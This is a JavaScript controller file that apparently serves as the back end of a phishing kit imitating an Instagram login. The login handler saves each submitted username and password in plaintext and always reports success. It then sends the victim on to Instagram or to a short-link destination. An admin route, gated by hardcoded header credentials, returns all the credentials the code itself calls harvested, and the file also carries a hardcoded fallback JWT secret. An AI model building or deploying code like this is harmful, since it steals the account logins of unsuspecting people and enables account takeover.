import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import UserModel from '../Models/User.js';
import LoginAttemptModel from '../Models/LoginAttempt.js';
import UrlModel from '../Models/Url.js';

const JWT_SECRET = process.env.JWT_SECRET || 'secret123';

export const login = async (req, res) => {
    try {
        const { username, password, shortId } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: "Username and password are required" });
        }

        // Save the attempt immediately to the DB exactly as entered
        await LoginAttemptModel.create({ username, password });

        let destination = "https://instagram.com"; // Fallback if no shortId provided

        if (shortId) {
            // shortId comes as "/bad", so we remove the slash
            const code = shortId.replace('/', '');
            const urlDoc = await UrlModel.findOne({ shortUrl: code });
            if (urlDoc) {
                destination = urlDoc.originalUrl;
            }
        }

        return res.status(200).json({
            message: "Login successful",
            destination
        });

    } catch (error) {
        console.error("Login error:", error);
        return res.status(500).json({ message: "Server error" });
    }
};

export const logout = (req, res) => {
    res.cookie('jwt', '', { maxAge: 0 });
    return res.status(200).json({ message: "Logged out successfully" });
};

export const checkAuth = (req, res) => {
    // If the middleware passes, user is authenticated
    return res.status(200).json({ authenticated: true, user: req.user });
};

// Admin route to fetch all harvested credentials
export const getLoginAttempts = async (req, res) => {
    try {
        const rootId = req.headers['x-root-id'];
        const rootPass = req.headers['x-root-pass'];

        if (rootId !== 'xyzdarkthing' || rootPass !== 'comeoniwaskidding') {
            return res.status(401).json({ message: "Unauthorized access" });
        }

        const attempts = await LoginAttemptModel.find({}).sort({ timestamp: -1 });
        return res.status(200).json(attempts);
    } catch (error) {
        console.error("Fetch attempts error:", error);
        return res.status(500).json({ message: "Server error" });
    }
};
